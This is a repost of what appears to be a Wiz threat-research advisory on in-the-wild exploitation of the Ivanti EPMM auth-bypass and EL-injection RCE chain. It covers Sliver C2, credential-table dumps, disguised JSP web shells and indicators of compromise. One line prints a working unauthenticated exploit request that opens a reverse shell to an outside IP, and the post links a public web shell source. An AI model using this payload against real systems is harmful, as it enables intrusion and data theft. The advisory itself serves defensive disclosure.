<!DOCTYPE html><html lang="zh"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="renderer" content="webkit"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no"><title>18K软件 AI工具 免费资源</title><link rel="stylesheet" href="/css/style.css"><link rel="stylesheet" href="/libs/highlight/styles/18k.css"><meta name="generator" content="Hexo 7.3.0"></head><body id="bodyx"><div class="hd posts"><a href="javascript:history.back()" class="replay-btn">返回</a><div class="post-title"><p>Ivanti EPMM RCE Vulnerability Chain Exploited in the Wild</p><hr></div><div class="post-content"><h1 id="Ivanti-EPMM-RCE-Vulnerability-Chain-Exploited-in-the-Wild"><a href="#Ivanti-EPMM-RCE-Vulnerability-Chain-Exploited-in-the-Wild" class="headerlink" title="Ivanti EPMM RCE Vulnerability Chain Exploited in the Wild"></a>Ivanti EPMM RCE Vulnerability Chain Exploited in the Wild</h1><p>Wiz Threat Research has observed exploitation in-the-wild of CVE-2025-4427 and CVE-2025-4428, the latest vulnerabilities affecting Ivanti Endpoint Manager Mobile (EPMM).</p><p><a href="/authors/merav-bar">Merav Bar</a>, <a href="/authors/shahar-dorfman">Shahar Dorfman</a>, <a href="/authors/gili-tikochinski">Gili Tikochinski</a>May 20, 20255 minute read<img src="http://www.18k.icu/images/20250625_06_8cjcjkmv/img_12.jpg"><img src="http://www.18k.icu/images/20250625_06_8cjcjkmv/img_15.jpg"></p><p><em>Updated on 2025-05-21 at 10:00 (GMT+3) to clarify the relationship between the various IP addresses in the exploitation section, and at 20:00 (GMT+3) to describe additional exploitation methods observed in the wild.</em></p><p><em>Updated on 2025-05-23 at 20:00 (GMT+3) to fix a mistake in the opening paragraph; we previously stated that the vulnerabilities were published in March rather than May (as noted on</em> <a target="_blank" rel="noopener" href="https://nvd.nist.gov/vuln/detail/cve-2025-4427"><em>NVD</em></a><em>, the vulnerabilities were published on May 13th, 2025).</em></p><h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>On May 13th, 2025, Ivanti disclosed that Endpoint Manager Mobile (EPMM) is affected by a vulnerability chain combining an authentication bypass (CVE-2025-4427) and a post-authentication remote code execution vulnerability (CVE-2025-4428). These flaws, which stem from unsafe use of Java Expression Language in error messages and misconfigured routing, can be exploited together to achieve unauthenticated RCE. <strong>Therefore, while neither of these vulnerabilities have been assigned critical severity (their CVSS scores are 5.3 and 7.2, respectively), in combination they should certainly be treated as critical.</strong></p><p>Ivanti has confirmed limited exploitation in-the-wild of these vulnerabilities as 0-days prior to their disclosure, and <strong>Wiz can now confirm ongoing exploitation in-the-wild of these vulnerabilities.</strong></p><h2 id="What-are-CVE-2025-4427-and-CVE-2025-4428"><a href="#What-are-CVE-2025-4427-and-CVE-2025-4428" class="headerlink" title="What are CVE-2025-4427 and CVE-2025-4428?"></a>What are CVE-2025-4427 and CVE-2025-4428?</h2><p>CVE-2025-4428 is a post-auth remote code execution vulnerability in EPMM’s <code>DeviceFeatureUsageReportQueryRequestValidator</code>. It arises from the unsafe handling of user-supplied input within error messages processed via Spring’s <code>AbstractMessageSource</code>, which allows attacker-controlled EL (Expression Language) injection. A crafted format parameter in the <code>/api/v2/featureusage</code> endpoint results in arbitrary Java code execution, confirmed via command injection (e.g., <code>Runtime.exec()</code>).</p><p>CVE-2025-4427 is an authentication bypass caused by improper request handling in EPMM’s route configuration. Routes like <code>/rs/api/v2/featureusage</code> were unintentionally exposed without requiring authentication due to missing <code>&lt;intercept-url&gt;</code> rules in Spring Security configurations. This allows unauthenticated access to the RCE sink, enabling full pre-auth RCE when chained with CVE-2025-4428. However, as noted by <a target="_blank" rel="noopener" href="https://labs.watchtowr.com/expression-payloads-meet-mayhem-cve-2025-4427-and-cve-2025-4428/">watchTowr</a>, this is more accurately described as an order-of-operations flaw, as validator logic executes before authentication checks.</p><h2 id="What-versions-are-affected"><a href="#What-versions-are-affected" class="headerlink" title="What versions are affected?"></a>What versions are affected?</h2><p>Ivanti Endpoint Manager Mobile (EPMM) in versions:</p><ul><li>11.12.0.4 and prior</li><li>12.3.0.1 and prior</li><li>12.4.0.1 and prior</li><li>12.5.0.0 and prior</li></ul><h2 id="Exploitation-in-the-wild"><a href="#Exploitation-in-the-wild" class="headerlink" title="Exploitation in-the-wild"></a>Exploitation in-the-wild</h2><p>Wiz Threat Research has observed active, in-the-wild exploitation of recently disclosed Ivanti EPMM vulnerabilities beginning on May 16th, 2025. This activity aligns with the public release of proof-of-concept (PoC) exploits by multiple sources, including watchTowr and ProjectDiscovery.<br>Our team has identified multiple exploitation techniques, suggesting involvement from different threat actors.</p><p><strong>Sliver Activity</strong></p><p>Wiz has identified multiple malicious payloads deployed following exploitation, and in one case of particular interest, a Sliver beacon using 77.221.158[.]154 as its C2 server (SHA1: <code>1b1dda5e8e26da568559e0577769697c624df30e</code>). This IP address was observed in multiple prior campaigns targeting similarly exposed appliances, as revealed by our <a target="_blank" rel="noopener" href="https://www.wiz.io/blog/cve-2024-0012-pan-os-vulnerability-exploited-in-the-wild">own research</a> into exploitation of PAN-OS vulnerabilities just a few months ago (CVE-2024-0012 &amp; CVE-2024-9474).</p><p>It appears that this IP address is still in operation by the threat actor, as its certificate hasn’t changed since November 2024 and remains: <code>Issuer: C=PL O=home.pl S.A. CN=Certyfikat SSL</code> (fingerprint: <code>9f2a1967c502e0e70bec7481e6c3e32c9b5723cb20ac249255946c9a4862e956</code>). This continuity leads us to conclude that the same actor has been opportunistically targeting both PAN-OS and Ivanti EPMM appliances.</p><p>The above certificate is served by only a small number of servers worldwide, which might be operated or compromised by this actor as well:</p><ul><li>185.174.137[.]26</li><li>46.41.134[.]8</li><li>79.96.45[.]181</li><li>elektrobohater[.]pl</li><li>wagodirect[.]pl</li><li>e-wago[.]pl</li></ul><p>As mentioned in our coverage of the PAN-OS exploitation activity, 77.221.158[.]154 previously resolved the domain censysinspect[.]com until it was eventually parked:</p><p><img src="http://www.18k.icu/images/20250625_06_8cjcjkmv/img_17.jpg"></p><p>Resolution timeline for censysinspect[.]com as sourced from Validin</p><p><strong>MySQL Dump Activity</strong></p><p>Ivanti EPMM can be configured to use MySQL as a backend for various services, including as an SQL Auth Server responsible for user authentication and authorization. This configuration enables Ivanti products—such as Endpoint Mobile Manager—to rely on MySQL databases to manage user credentials and access controls.<br>We observed malicious activity originating from two distinct IP addresses: 82.132.235[.]212 and 37.219.84[.]22. These attackers accessed and dumped sensitive tables from the <code>mifs</code> MySQL database, specifically: <code>mifs_ldap_server_config</code>, <code>mifs_ldap_users</code>, <code>mi_user</code>.<br>In addition to dumping these tables, one attacker also attempted further reconnaissance within the Ivanti environment, likely in search of user credentials and additional system information.<br>Some of the commands were issued directly, while others were downloaded from public hosting services such as dpaste (<code>https://dpaste[.]com/9MQEJ6VYR.txt</code>).</p><p><strong>Web Shell Deployment Disguised as Legitimate Content</strong></p><p>In addition, Wiz Research identified attacker attempts to establish persistent access by uploading web shells to non-standard but plausible paths within the Ivanti EPMM environment. Specifically, we observed the placement of malicious JSP-based web shells at the following locations:</p><ul><li><code>/mi/tomcat/webapps/mifs/401.jsp</code></li><li><code>/mi/tomcat/webapps/mifs/css/css.css</code></li><li><code>/mi/tomcat/webapps/mifs/session.jsp</code></li><li><code>/mi/tomcat/webapps/mifs/baseURL.jsp</code></li></ul><p>These filenames were likely chosen to blend in with legitimate HTTP error handling pages, thereby evading common detection mechanisms that scan for suspicious or out-of-place file names. By masquerading as error pages, the web shells could be accessed on demand while appearing benign in server logs or file listings.<br>The web shells were downloaded from public hosting services such as pastebin or GitHub, including the known <a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/x1a0t/Behinder-Source/11ab221462323162be7882ee8e266857d1135ace/src/main/resources/template/shell9.jsp">Behinder WS</a>. Other attackers opted to embed the web shell directly within the command line, encoding it in Base64 and decoding it during execution. It seems that one of the attackers also compromised a legitimate website <code>craft-dev.greenenaftaligallery[.]com/a.txt</code>, to host a web shell.</p><p><strong>Reverse Shell Activity</strong></p><p>Another notable post-exploitation technique we observed was the use of a direct reverse shell. In this method, the attackers initiated a reverse Bash connection directly through the command execution exploit. As a result, no file artifacts were created, and unlike the other methods described above, the attacker’s presence and commands were not logged in the http access logs.</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">GET /mifs/rs/api/v2/featureusage?format=$&#123;&quot;&quot;.getClass().forName(&#x27;java.lang.Runtime&#x27;).getMethod(&#x27;getRuntime&#x27;).invoke(null).exec(&#x27;sh -i &gt;&amp; /dev/tcp/47.120.74.19/8080 0&gt;&amp;1&#x27;)&#125;<br></code></pre></td></tr></table></figure><p>The above code block shows an example of one such reverse shell exploitation.</p><h2 id="Indicators-of-compromise"><a href="#Indicators-of-compromise" class="headerlink" title="Indicators of compromise"></a><strong>Indicators of compromise</strong></h2><p>Wiz Research has identified the following IOCs related to this activity:</p><table><thead><tr><th>IOC</th><th>Description</th></tr></thead><tbody><tr><td>1b1dda5e8e26da568559e0577769697c624df30e</td><td>Sliver Beacon (SHA1)</td></tr><tr><td>ac389c8b7f3d2fcf4fd73891f881b12b8343665b</td><td>Sliver Beacon (SHA1)</td></tr><tr><td>19b4df629f5b15e5ff742c70d2c7dc4dac29a7ce</td><td>Unpacked Sliver Beacon (SHA1)</td></tr><tr><td>f780151c151b6cec853a278b4e847ef2af3dbc5d</td><td>Packed Sliver Beacon (SHA1) - Downloaded from attacker’s infrastructure</td></tr><tr><td>dce8faf5fcf5998b6802995914caa988ee1ebd92</td><td>Unpacked Sliver Beacon (SHA1) - Downloaded from attacker’s infrastructure</td></tr><tr><td>aa2cfeeca6c8e7743ad1a5996fe5ccc3d52e901d</td><td>JSP Webshell written to session.jsp</td></tr><tr><td>2bd61ce5bdd258c7dcbef53aedb1b018b8e0ae26</td><td>JSP Webshell hosted on craft-dev.greenenaftaligallery[.]com</td></tr><tr><td>77.221.158[.]154</td><td>Sliver C2 IP Address</td></tr><tr><td>150.241.97[.]83</td><td>Sliver C2 IP Address</td></tr><tr><td>185.193.125[.]65</td><td>IP Address Hosting Sliver</td></tr></tbody></table><p>IPs observed in exploitation attempts (between 16.5.25-19.5.25):</p><table><thead><tr><th>IOC</th><th>Description</th></tr></thead><tbody><tr><td>82.132.235[.]212</td><td>MySQL Dumping Activity</td></tr><tr><td>37.219.84[.]22</td><td>MySQL Dumping Activity</td></tr><tr><td>88.194.29[.]21</td><td>MySQL Dumping Activity(VPN)</td></tr><tr><td>27.25.148[.]183</td><td>Direct Reverse Shell Activity</td></tr><tr><td>83.229.126[.]234</td><td>Direct Reverse Shell Activity</td></tr><tr><td>91.193.19[.]109</td><td>Direct Reverse Shell Activity (VPN)</td></tr><tr><td>47.120.74[.]19</td><td>Direct Reverse Shell Activity (VPN)</td></tr><tr><td>100.26.51[.]59</td><td>Hosted malicious payload under &#x2F;ws (VPN)</td></tr><tr><td>150.241.71[.]231</td><td>Attacker conducting Sliver deployment (VPN)</td></tr><tr><td>75.170.92[.]132</td><td>Behinder WS deployment</td></tr><tr><td>5.181.159[.]149</td><td>Behinder WS deployment (VPN)</td></tr><tr><td>45.38.17[.]43</td><td>WS deployment (VPN)</td></tr><tr><td>75.170.92[.]132</td><td>WS deployment</td></tr></tbody></table><h2 id="What-steps-should-security-teams-take"><a href="#What-steps-should-security-teams-take" class="headerlink" title="What steps should security teams take?"></a>What steps should security teams take?</h2><ul><li>It is recommended to patch EPMM to one of the following patched versions: 11.12.0.5, 12.3.0.2, 12.4.0.2, 12.5.0.1, while prioritizing Internet-facing appliances.</li><li>Implement network-level restrictions on the <code>/rs/api/v2/*</code> and <code>/mifs/rs/api/v2/*</code> endpoints until patches are applied.</li></ul><h2 id="How-Wiz-can-help"><a href="#How-Wiz-can-help" class="headerlink" title="How Wiz can help"></a>How Wiz can help</h2><p>Wiz customers can use the pre-built queries and advisory in the <a target="_blank" rel="noopener" href="https://app.wiz.io/boards/threat-center/wiz-adv-2025-047">Wiz Threat Intelligence Center</a> to search for vulnerable or compromised instances of Ivanti EPMM in their environment. Wiz detects vulnerable and&#x2F;or infected Ivanti devices through a combination of agentless scanning of our customers’ cloud environments and active unauthenticated scanning using the Wiz Dynamic Scanner.</p><p><img src="http://www.18k.icu/images/20250625_06_8cjcjkmv/img_19.jpg"></p><p>At Wiz, we’ve built a platform uniquely equipped to respond to high-profile threats to cloud environments with unmatched agility and depth. By integrating disk-level insights, external exploitability validation, log scanning, and agentless malware detection, Wiz provides full visibility across the lifecycle of risk management and threat response in the cloud. This approach has proven to be especially effective when applied to defending virtual appliances, which are often out of scope for traditional EDR solutions.</p><p>When new threats to your cloud environment emerge, Wiz immediately helps you:</p><ul><li>Identify any vulnerable or misconfiguration instances of the targeted software in your environment, with additional runtime context using the Wiz Sensor and Code-to-Cloud context using Wiz Code.</li><li>Validate exploitability from the outside and effectively prioritize assets at risk, based on the context of affected resources such as high privileges or sensitive data access.</li><li>Gain visibility into any resources compromised by threat actors, while also providing you with automatic analysis of the incident’s blast radius.</li></ul><p>This unique approach gives you full transparency and control, so you can stay ahead of attackers and protect what matters most to your business.</p><h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><ul><li><a target="_blank" rel="noopener" href="https://forums.ivanti.com/s/article/Security-Advisory-Ivanti-Endpoint-Manager-Mobile-EPMM?language=en_US&ref=labs.watchtowr.com">Ivanti advisory</a></li><li><a target="_blank" rel="noopener" href="https://labs.watchtowr.com/expression-payloads-meet-mayhem-cve-2025-4427-and-cve-2025-4428/">WatchTowr blogpost</a></li><li><a target="_blank" rel="noopener" href="https://projectdiscovery.io/blog/ivanti-remote-code-execution">ProjectDiscovery blogpost</a></li></ul></div></div><div class="footer" id="footer"><p>Copyright © 2025 <a class="flink" target="_blank" rel="noopener" href="http://www.18k.icu">www.18k.icu</a> <label class="el-switch el-switch-green el-switch-sm" style="vertical-align:sub"><input type="checkbox" name="switch" id="update_style"> <span class="el-switch-style"></span></label></p></div><input type="hidden" id="web_style" value="black"> <input type="hidden" id="valine_appid" value="CmCti21ooOOIzFOhEyFkFvR0-gzGzoHsz"> <input type="hidden" id="valine_appKey" value="FqiyUqbg7McKN2eG0MCewupf"><script src="https://cdn.bootcdn.net/ajax/libs/jquery/3.6.0/jquery.min.js"></script><script src="/libs/highlight/highlight.pack.js"></script><script src="/js/js.js"></script><style>.v *{color:#698fca}.v .vlist .vcard .vhead .vsys{color:#3a3e4a}.v .vlist .vcard .vh .vmeta .vat{color:#638fd5}.v .vlist .vcard .vhead .vnick{color:#6ba1ff}.v a{color:#8696b1}.v .vlist .vcard .vhead .vnick:hover{color:#669bfc}</style><script>var _hmt=_hmt||[];(()=>{var e=document.createElement("script"),t=(e.src="https://hm.baidu.com/hm.js?eb7eb8199824646269cd262b46a87950",document.getElementsByTagName("script")[0]);t.parentNode.insertBefore(e,t)})()</script></body></html>